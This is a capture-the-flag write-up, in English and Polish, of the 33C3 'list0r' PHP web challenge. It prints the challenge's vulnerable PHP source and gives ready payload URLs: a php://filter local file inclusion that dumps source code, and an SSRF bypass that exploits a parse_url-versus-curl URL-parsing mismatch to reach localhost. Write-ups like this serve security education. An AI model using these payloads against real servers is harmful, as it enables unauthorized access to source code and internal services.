# list0r (web 400)

###ENG
[PL](#pl-version)

In the task we get a webpage where user can create lists of things.
We quickly realise that it's possible to login as admin with any password and username `admin` and from this we get information that the flag is at `http://78.46.224.80/reeeaally/reallyy/c00l/and_aw3sme_flag`
But we can't get the flag because there is a check to verify IP address and the query has to come from 127.0.0.1

We also quickly notice that there is php filter vulnerability combined with local file inclusion there.

The links are for example `http://78.46.224.80/?page=profile` and the `page` GET parameter is included with `.php` added at the end.
We can, however, do: `http://78.46.224.80/?page=php://filter/read=convert.base64-encode/resource=profile` to get the base64 encoded source of the included file.

This way we extract all source codes from the page.

There are two interesting bits.
First one is that we can provide a link to avatar and the picture will be downloaded.
In case it's not an actual image, the contents will be printed!
It seems perfect for our needs because it will print the flag and the query will be run from localhost.

```php
if (isset($_POST["pic"]) && $_POST["pic"] != "" && !is_admin()) {
	$pic = get_contents($_POST["pic"]);
	if (!is_image($pic)) {
		die("<p><h3 style=color:red>Does this look like an image to you???????? people are dumb these days...</h3></p>" . htmlspecialchars($pic));
	} else {
		$pic_name = "profiles/" . sha1(rand());
		file_put_contents($pic_name, $pic);
	}
}
```

The second interesting bit is the `get_contents` function:


```php
function in_cidr($cidr, $ip) {
	list($prefix, $mask) = explode("/", $cidr);

	return 0 === (((ip2long($ip) ^ ip2long($prefix)) >> $mask) << $mask);
}

function get_contents($url) {
	$disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];

	do {
		$url_parts = parse_url($url);

		if (!array_key_exists("host", $url_parts)) {
			die("<p><h3 style=color:red>There was no host in your url!</h3></p>");
		}

		$host = $url_parts["host"];

		if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
			$ip = $host;
		} else {
			$ip = dns_get_record($host, DNS_A);
			if (count($ip) > 0) {
				$ip = $ip[0]["ip"];
				debug("Resolved to {$ip}");
			} else {
				die("<p><h3 style=color:red>Your host couldn't be resolved man...</h3></p>");
			}
		}

		foreach ($disallowed_cidrs as $cidr) {
			if (in_cidr($cidr, $ip)) {
				die("<p><h3 style=color:red>That IP is a blacklisted cidr ({$cidr})!</h3></p>");
			}
		}

		// all good, curl now
		debug("Curling {$url}");
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
		curl_setopt($curl, CURLOPT_TIMEOUT, 3);
		curl_setopt($curl, CURLOPT_PROTOCOLS, CURLPROTO_ALL 
			& ~CURLPROTO_FILE 
			& ~CURLPROTO_SCP); // no files plzzz
		curl_setopt($curl, CURLOPT_RESOLVE, array($host.":".$ip)); // no dns rebinding plzzz

		$data = curl_exec($curl);

		if (!$data) {
			die("<p><h3 style=color:red>something went wrong....</h3></p>");
		}

		if (curl_error($curl) && strpos(curl_error($curl), "timed out")) {
			die("<p><h3 style=color:red>Timeout!! thats a slowass  server</h3></p>");
		}

		// check for redirects
		$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
		if ($status >= 301 and $status <= 308) {
			$url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
		} else {
			return $data;
		}

	} while (1);
}
```

This function seems to block any local address query, so we can't try to get a local file with flag.
The trick here is that the IP is checked using `parse_url` PHP function, while the call itself is done with curl.

We remember that there was a similar vulnerability exploited on a CTF a while ago.
The PHP function does not parse url correctly if username and passwords are provided!
If we use URL `http://what:ever@127.0.0.1:80@33c3ctf.ccc.ac/reeeaally/reallyy/c00l/and_aw3sme_flag`

The PHP will get:

```
array (
  'scheme' => 'http',
  'host' => '33c3ctf.ccc.ac',
  'user' => 'what',
  'pass' => 'ever@127.0.0.1:80',
  'path' => '/reeeaally/reallyy/c00l/and_aw3sme_flag',
)
```

So it will assume we query the host `33c3ctf.ccc.ac` and the CIDR checks will not block us.
But what curl will assume is that the user is `what`, pass is `ever` and host is `127.0.0.1:80`, which is exactly what we need.

So in the end we will get:

```
Does this look like an image to you???????? people are dumb these days...

33C3_w0w_is_th3r3_anything_that_php_actually_gets_right?!??? 
```

###PL version

W zadaniu dostajemy stronę internetową gdzie można tworzyć sobie listy.
Szybko zauważamy że można zalogować się jako admin z dowolnym hasłem i dowiadujemy się, ze flaga jest pod `http://78.46.224.80/reeeaally/reallyy/c00l/and_aw3sme_flag`
Nie możemy jednak po prostu jej odczytać, bo request musi iść z IP 127.0.0.1

Szybko zauważyliśmy też, że jest tam podatność php filter połączona z local file inclusion.

Linki to np. `http://78.46.224.80/?page=profile` a parametr GET `page` jest includowany z dodaniem `.php`.
Możemy jednak zrobić `http://78.46.224.80/?page=php://filter/read=convert.base64-encode/resource=profile` aby dostać zawartość includowanego pliku jako base64.

W ten sposób wyciągamy źródła wszystkich plików php.

Są tam dwa ciekawe elementy.
Pierwszy to miejsce gdzie możemy załadować avatar z podanego przez nas linku.
Plik zostanie pobrany i jeśli nie jest obrazkiem, wypisana zostanie jego zawartość.
To wydaje się idealne do naszych potrzeb ponieważ wypisze nam flagę a request będzie szedł z localhosta.

```php
if (isset($_POST["pic"]) && $_POST["pic"] != "" && !is_admin()) {
	$pic = get_contents($_POST["pic"]);
	if (!is_image($pic)) {
		die("<p><h3 style=color:red>Does this look like an image to you???????? people are dumb these days...</h3></p>" . htmlspecialchars($pic));
	} else {
		$pic_name = "profiles/" . sha1(rand());
		file_put_contents($pic_name, $pic);
	}
}
```

Drugi ciekawy element to sama funkcja `get_contents`:

```php
function in_cidr($cidr, $ip) {
	list($prefix, $mask) = explode("/", $cidr);

	return 0 === (((ip2long($ip) ^ ip2long($prefix)) >> $mask) << $mask);
}

function get_contents($url) {
	$disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];

	do {
		$url_parts = parse_url($url);

		if (!array_key_exists("host", $url_parts)) {
			die("<p><h3 style=color:red>There was no host in your url!</h3></p>");
		}

		$host = $url_parts["host"];

		if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
			$ip = $host;
		} else {
			$ip = dns_get_record($host, DNS_A);
			if (count($ip) > 0) {
				$ip = $ip[0]["ip"];
				debug("Resolved to {$ip}");
			} else {
				die("<p><h3 style=color:red>Your host couldn't be resolved man...</h3></p>");
			}
		}

		foreach ($disallowed_cidrs as $cidr) {
			if (in_cidr($cidr, $ip)) {
				die("<p><h3 style=color:red>That IP is a blacklisted cidr ({$cidr})!</h3></p>");
			}
		}

		// all good, curl now
		debug("Curling {$url}");
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
		curl_setopt($curl, CURLOPT_TIMEOUT, 3);
		curl_setopt($curl, CURLOPT_PROTOCOLS, CURLPROTO_ALL 
			& ~CURLPROTO_FILE 
			& ~CURLPROTO_SCP); // no files plzzz
		curl_setopt($curl, CURLOPT_RESOLVE, array($host.":".$ip)); // no dns rebinding plzzz

		$data = curl_exec($curl);

		if (!$data) {
			die("<p><h3 style=color:red>something went wrong....</h3></p>");
		}

		if (curl_error($curl) && strpos(curl_error($curl), "timed out")) {
			die("<p><h3 style=color:red>Timeout!! thats a slowass  server</h3></p>");
		}

		// check for redirects
		$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
		if ($status >= 301 and $status <= 308) {
			$url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
		} else {
			return $data;
		}

	} while (1);
}
```

Ta funkcja wydaje się blokować dowolny lokalny adres, więc nie możemy pobrać lokalnego pliku z flagą.
Trik polega na tym, że IP jest sprawdzane funkcją PHP `parse_url`, podczas gdy samo pobranie pliku za pomocą curl.

Pamiętamy, że niedawno podobna podatność była wykorzystana już na CTFie.
Funkcja PHP nie parsuje URL poprawnie jeśli podamy tam username i password.
Jeśli podamy URL `http://what:ever@127.0.0.1:80@33c3ctf.ccc.ac/reeeaally/reallyy/c00l/and_aw3sme_flag`

PHP odczyta to jako:

```
array (
  'scheme' => 'http',
  'host' => '33c3ctf.ccc.ac',
  'user' => 'what',
  'pass' => 'ever@127.0.0.1:80',
  'path' => '/reeeaally/reallyy/c00l/and_aw3sme_flag',
)
```

Więc założy że odpytujemy hosta `33c3ctf.ccc.ac` i żaden z testów CIDR nas nie zablokuje.
Jednak curl odczyta to inaczej i user to `what`, hasło to `ever` a host to `127.0.0.1:80`, czyli dokładnie to czego nam potrzeba.

Finalnie dla takiego avatara dostajemy:

```
Does this look like an image to you???????? people are dumb these days...

33C3_w0w_is_th3r3_anything_that_php_actually_gets_right?!??? 
```
